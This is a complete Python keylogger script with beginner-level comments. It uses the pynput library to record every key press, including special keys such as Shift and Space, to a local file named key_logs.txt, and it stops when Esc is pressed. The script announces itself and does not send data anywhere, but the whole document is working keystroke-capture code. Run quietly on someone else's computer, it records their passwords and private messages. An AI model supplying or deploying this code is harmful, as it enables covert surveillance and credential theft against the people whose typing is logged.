# Import the 'keyboard' part from the 'pynput' library
# This library lets us listen to keyboard presses
from pynput import keyboard

# Define the name of the file where we will store the keystrokes
LOG_FILE = "key_logs.txt"

print(f"Keylogger started. Saving logs to {LOG_FILE}...")
print("Press 'Esc' to stop the keylogger.")

def on_press(key):
    """
    This function is called every time a key is pressed.
    """
    try:
        # Open the log file in 'append' mode ('a')
        # This adds new text to the end of the file without deleting old text
        with open(LOG_FILE, 'a') as f:
            
            # 'key.char' gets the character of the key (like 'a', 'b', '1')
            # We write this character to the file
            f.write(key.char)
            
    except AttributeError:
        # This 'except' block runs if 'key.char' fails
        # This happens for special keys like 'Shift', 'Ctrl', 'Space', 'Esc'
        
        with open(LOG_FILE, 'a') as f:
            # Check if the key is the 'Escape' key
            if key == keyboard.Key.esc:
                # If 'Esc' is pressed, stop the listener and exit the program
                print("Escape key pressed. Stopping keylogger.")
                return False # Returning False stops the listener

            # For other special keys, we write their name
            # (like 'Key.space' or 'Key.shift')
            # We add a space to make the log file easier to read
            f.write(f" [{str(key)}] ")

# --- This is the main part of the script ---

# We create a 'Listener' object that will run the 'on_press' function
# every time a key is pressed.
with keyboard.Listener(on_press=on_press) as listener:
    
    # 'listener.join()' tells the script to wait and keep listening
    # The script will stay running here until the listener is stopped
    # (which happens when we press 'Esc' and return False)
    listener.join()

print("Keylogger has been stopped.")